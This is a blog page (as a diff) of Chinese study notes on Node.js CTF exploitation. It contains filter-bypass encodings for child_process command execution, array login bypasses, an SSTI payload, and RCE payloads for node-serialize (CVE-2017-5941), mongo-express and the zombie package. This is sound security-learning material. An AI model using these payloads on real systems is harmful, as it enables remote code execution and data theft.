@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-js -web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 不知道这个坑有没有挖，不过这块可以说是知识盲区了，简单安排一下nodejs这块的知识吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nodejs常见知识点总结">
+<meta property="og:url" content="http://example.com/2022/05/11/nodejs%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 不知道这个坑有没有挖，不过这块可以说是知识盲区了，简单安排一下nodejs这块的知识吧。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/05/12/7ha5wdxOXUFWJ98.png">
+<meta property="article:published_time" content="2022-05-11T08:23:17.000Z">
+<meta property="article:modified_time" content="2022-05-12T12:09:09.813Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-js -web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/12/7ha5wdxOXUFWJ98.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/05/11/nodejs常见知识点总结/"/>
+
+
+
+
+
+  <title>nodejs常见知识点总结 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/nodejs%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">nodejs常见知识点总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-05-11T16:23:17+08:00">
+                2022-05-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>不知道这个坑有没有挖，不过这块可以说是知识盲区了，简单安排一下nodejs这块的知识吧。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>解题时遇到各种各样的过滤总是令人头疼，为了成功bypass，我们需要掌握一定的姿势。</p>
+<h2 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h2><p>最经典的字符串与十六进制等价：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;a&quot;===&quot;\x61&quot;);</span><br><span class="line">// true</span><br></pre></td></tr></table></figure>
+
+<h2 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h2><p>js中很常见的一种编码方式，和十六进制是类似的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;\u0061&quot;===&quot;a&quot;);</span><br><span class="line">// true</span><br></pre></td></tr></table></figure>
+
+<h2 id="加号拼接"><a href="#加号拼接" class="headerlink" title="加号拼接"></a>加号拼接</h2><p>ssti中常用的加号拼接放在js中也是可以实现的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;a&quot;+&quot;bc&quot;===&quot;abc&quot;);</span><br><span class="line">// true</span><br></pre></td></tr></table></figure>
+
+<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>很经典的思路，各路语言的绕过都必须有base64：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(Buffer.from(&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;,&#x27;base64&#x27;).toString())</span><br><span class="line">//global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><p>和c语言中的宏定义比较类似，可以直接嵌入式表达字符串字面量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;curl 127.0.0.1:1234&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="concat连接"><a href="#concat连接" class="headerlink" title="concat连接"></a>concat连接</h2><p>这个也和ssti常用的一样，用concat函数直接拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="JS大小写"><a href="#JS大小写" class="headerlink" title="JS大小写"></a>JS大小写</h1><p>这是个老考点了，就是利用在<code>toUpperCase()</code>中，字符<code>ı</code>会转变为<code>I</code>，字符<code>ſ</code>会变为<code>S</code>，而在<code>toLowerCase()</code>中，字符<code>İ</code>会转变为<code>i</code>，字符<code>K</code>会转变为<code>k</code>。</p>
+<p>其实js中还有两个函数方法，<code>toLocaleUpperCase()</code>和<code>toLocaleLowerCase()</code>，这两个函数的作用也是将字符串变为大写或小写。这两个函数与前面两个函数的区别在于，后两个函数在将字符串中所有的字母字符都将被转换为大（小）写的同时，会适应宿主环境的当前区域设置。因此如果语言规则与常规的 Unicode 大小写映射方式冲突，那么结果就会不同。</p>
+<p>不过要利用这个漏洞，还是需要前两个函数。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>js的<code>eval()</code>同样也可以执行js语句。而Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令，我们构造这样如下的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()</span><br><span class="line">require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;./&#x27;]).stdout.toString()</span><br><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).toString()</span><br></pre></td></tr></table></figure>
+
+<p>如果exec或者load这类关键词被过滤，我们除了用上面第二个payload以及bypass之外，还可以用以下方法绕过：</p>
+<ol>
+<li><p>fs模块<br>利用fs模块同样也可以做到读取当前目录的文件名，并且可以读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">require(&#x27;fs&#x27;).readFileSync(&#x27;flag.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure></li>
+<li><p>文件读取<br>如果只是做一些简单的文件读取的话，利用这两个变量即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。如果在模块中，返回的值是模块文件的路径。</span><br><span class="line">__dirname 表示当前执行脚本所在的目录。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="数组利用"><a href="#数组利用" class="headerlink" title="数组利用"></a>数组利用</h1><p>js中对于数组的利用也是比较多的，毕竟又能报错又能绕过的东西都是我们最喜欢的。</p>
+<p>报错利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function LoginController(req, res) &#123;</span><br><span class="line">    if (req.body.username === &quot;admin&quot; &amp;&amp; req.body.password.length === 16) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            req.body.password = req.body.password.toUpperCase()</span><br><span class="line">            if (req.body.password !== &#x27;54gkj7n8uo55vbo2&#x27;) &#123;</span><br><span class="line">                return res.status(403).json(&#123;msg: &#x27;invalid username or password&#x27;&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (__) &#123;&#125;</span><br><span class="line">        req.session[&#x27;unique_id&#x27;] = randString.generate(16)</span><br><span class="line">        res.json(&#123;msg: &#x27;ok&#x27;&#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.status(403).json(&#123;msg: &#x27;login failed&#x27;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是hgame2022第四周的一道web题，其中一个考点就是在这个登陆上。阅读代码要求我们输入密码经过大写转换后等于一串小写密码，这显然是不可能的。但是我们注意到这里的异常报错处理机制的catch部分是没有返回值的，这就会带来漏洞，和也是实战中经常会存在的问题。</p>
+<p>官方wp给出的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:&#123;&quot;length&quot;: 16&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里也可以利用数组来搞事情，我当时的解法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:[&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var crypto = require(&#x27;crypto&#x27;);</span><br><span class="line"></span><br><span class="line">function md5(s) &#123;</span><br><span class="line">  return crypto.createHash(&#x27;md5&#x27;)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(&#x27;hex&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* GET home page. */</span><br><span class="line">router.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;xxxxxxx&#x27;;</span><br><span class="line">  var a = req.query.a;</span><br><span class="line">  var b = req.query.b;</span><br><span class="line">  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">  	res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">  	res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>数组绕过可以说道的点太多了，这里就简单的讲一个吧，要求输入的两个值长度不相等但是加上flag后的md5值相等。直接利用数组绕过，因为js中两个数组是不能直接用===判断相等的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure>
+
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>挖坑，最近没空研究原型链污染这个nodejs中比较大的一块，先放两篇文章，之后再填：<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">基于原型链的继承</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a></p>
+<h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1><p>这个之前在写ssti那块就讲过了，这里再记一下吧，本质上还是命令执行，不过不是基于eval()了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.constructor.constructor(&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>接下来总结一些比较经典的关于nodejs的CVE漏洞。</p>
+<h2 id="nodejs反序列化漏洞（CVE-2017-5941）"><a href="#nodejs反序列化漏洞（CVE-2017-5941）" class="headerlink" title="nodejs反序列化漏洞（CVE-2017-5941）"></a>nodejs反序列化漏洞（CVE-2017-5941）</h2><p>前置知识：IIFE<br>IIFE是一个在定义时就会立即执行的js函数，一般写成如下形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br></pre></td></tr></table></figure>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/IIFE">IIFE（立即调用函数表达式</a></p>
+<p><a href="mailto:&#110;&#111;&#x64;&#x65;&#45;&#x73;&#x65;&#114;&#105;&#x61;&#x6c;&#105;&#x7a;&#x65;&#x40;&#x30;&#46;&#48;&#46;&#52;">&#110;&#111;&#x64;&#x65;&#45;&#x73;&#x65;&#114;&#105;&#x61;&#x6c;&#105;&#x7a;&#x65;&#x40;&#x30;&#46;&#48;&#46;&#52;</a>中存在反序列化漏洞：<br><img src="https://s2.loli.net/2022/05/12/7ha5wdxOXUFWJ98.png"></p>
+<p>我们发现被框出的这一语句的eval参数是被括号包裹着的，如果我们构造一个形如<code>function()&#123;&#125;()</code>的函数，在反序列化时就会被当中IIEF立即调用执行。也就是不可信输入传递到unserialize()的时候执行任意代码。</p>
+<p>创建payload时最好使用同一模块的序列化函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">serialize = require(&#x27;node-serialize&#x27;);</span><br><span class="line">var test = &#123;</span><br><span class="line"> rce : function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line">console.log(&quot;Payload: \n&quot; + serialize.serialize(test));</span><br><span class="line"></span><br><span class="line">//&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，最终payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传递给反序列化执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var serialize = require(&#x27;node-serialize&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#x27;child_process\&#x27;).exec(\&#x27;ls /\&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#x27;;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
+
+<h2 id="nodejs目录穿越漏洞（CVE-2017-14849）"><a href="#nodejs目录穿越漏洞（CVE-2017-14849）" class="headerlink" title="nodejs目录穿越漏洞（CVE-2017-14849）"></a>nodejs目录穿越漏洞（CVE-2017-14849）</h2><p>影响版本：</p>
+<ul>
+<li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
+<li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li>
+</ul>
+<p>漏洞产生的原因就是nodejs8.5.0对目录进行normalize操作时出现了逻辑错误，导致路径向上跳跃时在中间位置添加一些字母就可以时normalize返回对应文件。</p>
+<p>例如，<code>…/…/…/foo/…/…/…/…/etc/passwd</code>可以使normalize返回<code>/etc/passwd</code>，但实际上正确结果应该是<code>…/…/…/…/…/…/etc/passwd</code>。</p>
+<p>这个漏洞主要应用在一些静态文件服务器上，比如，express在判断path是否超出静态目录范围时，就用到了normalize函数，上述BUG导致normalize函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。</p>
+<h1 id="mongo-express-rce（CVE-2019-10758）"><a href="#mongo-express-rce（CVE-2019-10758）" class="headerlink" title="mongo-express rce（CVE-2019-10758）"></a>mongo-express rce（CVE-2019-10758）</h1><p>关于沙盒逃逸这块可以讲得东西也很多，这里也没办法具体讲述，总之把payload贴在这里，然后放参考文章就完事了。</p>
+<p>payload1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://localhost:8081/checkValid&#x27; -H &#x27;Authorization: Basic YWRtaW46cGFzcw==&#x27;  --data &#x27;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">node main.js</span><br><span class="line">exploit = &quot;this.constructor.constructor(\&quot;return process\&quot;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)&quot;</span><br><span class="line"> </span><br><span class="line">var bson = require(&#x27;mongo-express/lib/bson&#x27;)</span><br><span class="line">bson.toBSON(exploit)</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/106751138">cve-2019-10758 mongo-express rce 漏洞分析</a></p>
+<h2 id="Nodejs-Zoombie-Package-RCE"><a href="#Nodejs-Zoombie-Package-RCE" class="headerlink" title="Nodejs Zoombie Package RCE"></a>Nodejs Zoombie Package RCE</h2><p>hgame那题markdown的第二部分考的就是这个payload，当时都没见过nodejs然后web就差一题ak。同样也是直接放payload与参考链接，这个参考链接正是当时hgame week4 markdown online的出题人。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.__proto__.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/">Nodejs Zoombie Package RCE 分析</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单总结了些node.js的知识点，也算是初步入门了吧，之后面对之前摆烂没做的nodejs的题目也可以去碰下了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/js-web/" rel="tag"># -js -web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/08/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" rel="next" title="http请求走私">
+                <i class="fa fa-chevron-left"></i> http请求走私
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">70</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
